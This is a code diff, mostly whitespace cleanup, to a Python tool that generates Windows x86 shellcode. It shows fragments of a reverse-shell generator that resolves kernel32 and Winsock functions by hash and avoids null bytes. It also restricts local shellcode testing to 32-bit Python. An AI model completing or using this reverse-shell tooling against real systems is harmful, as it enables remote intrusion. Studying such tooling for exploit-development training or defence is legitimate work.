@@ -72,7 +72,7 @@ def push_string(input_string):
                 first_instructions.append(f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
                 first_instructions.append("push ax;")
             null_terminated = True
-            
+
     instructions = first_instructions + instructions
     asm_instructions = "".join(instructions)
     return asm_instructions
@@ -85,11 +85,11 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     push_instr_wsastartup_hash = push_function_hash("WSAStartup")
     push_instr_wsasocketa_hash = push_function_hash("WSASocketA")
     push_instr_wsaconnect_hash = push_function_hash("WSAConnect")
-    
+
     asm = [
         "   start:                               ",
         f"{['', 'int3;'][breakpoint]}            ",
-        "       mov ebp, esp                    ;",  # 
+        "       mov ebp, esp                    ;",  #
         "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
         "   find_kernel32:                       ",
         "       xor ecx,ecx                     ;",  # ECX = 0
@@ -107,7 +107,7 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "   find_function_ret:                   ",
         "       pop esi                         ;",  # POP the return address from the stack
         "       mov [ebp+0x04], esi             ;",  # Save find_function address for later usage
-        "       jmp resolve_symbols_kernel32    ;",  # 
+        "       jmp resolve_symbols_kernel32    ;",  #
         "   find_function_shorten_bnc:           ",
         "       call find_function_ret          ;",  # Relative CALL with negative offset
         "   find_function:                       ",
@@ -306,7 +306,7 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     asm = [
         "   start:                               ",
         f"{['', 'int3;'][breakpoint]}            ",
-        "       mov ebp, esp                    ;",  # 
+        "       mov ebp, esp                    ;",  #
         "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
         "   find_kernel32:                       ",
         "       xor ecx,ecx                     ;",  # ECX = 0
@@ -324,7 +324,7 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "   find_function_ret:                   ",
         "       pop esi                         ;",  # POP the return address from the stack
         "       mov [ebp+0x04], esi             ;",  # Save find_function address for later usage
-        "       jmp resolve_symbols_kernel32    ;",  # 
+        "       jmp resolve_symbols_kernel32    ;",  #
         "   find_function_shorten_bnc:           ",
         "       call find_function_ret          ;",  # Relative CALL with negative offset
         "   find_function:                       ",
@@ -367,7 +367,7 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "       mov [esp+0x1c], eax             ;",  # Overwrite stack version of eax from pushad
         "   find_function_finished:              ",
         "       popad                           ;",  # Restore registers
-        "       ret                             ;",  # 
+        "       ret                             ;",  #
         "   resolve_symbols_kernel32:            ",
         push_instr_terminate_hash,                   # TerminateProcess hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
@@ -413,7 +413,7 @@ def msg_box(header, text, breakpoint=0):
     asm = [
         "   start:                               ",
         f"{['', 'int3;'][breakpoint]}            ",
-        "       mov ebp, esp                    ;",  # 
+        "       mov ebp, esp                    ;",  #
         "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
         "   find_kernel32:                       ",
         "       xor ecx,ecx                     ;",  # ECX = 0
@@ -431,7 +431,7 @@ def msg_box(header, text, breakpoint=0):
         "   find_function_ret:                   ",
         "       pop esi                         ;",  # POP the return address from the stack
         "       mov [ebp+0x04], esi             ;",  # Save find_function address for later usage
-        "       jmp resolve_symbols_kernel32    ;",  # 
+        "       jmp resolve_symbols_kernel32    ;",  #
         "   find_function_shorten_bnc:           ",
         "       call find_function_ret          ;",  # Relative CALL with negative offset
         "   find_function:                       ",
@@ -474,7 +474,7 @@ def msg_box(header, text, breakpoint=0):
         "       mov [esp+0x1c], eax             ;",  # Overwrite stack version of eax from pushad
         "   find_function_finished:              ",
         "       popad                           ;",  # Restore registers
-        "       ret                             ;",  # 
+        "       ret                             ;",  #
         "   resolve_symbols_kernel32:            ",
         push_instr_terminate_hash,                   # TerminateProcess hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
@@ -580,7 +580,7 @@ def main(args):
     print()
     print(final)
 
-    if args.test_shellcode:
+    if args.test_shellcode and (struct.calcsize("P")*8) == 32:
         print(f"\n[+] Debugging shellcode ...")
         sh = b""
         for e in encoding:
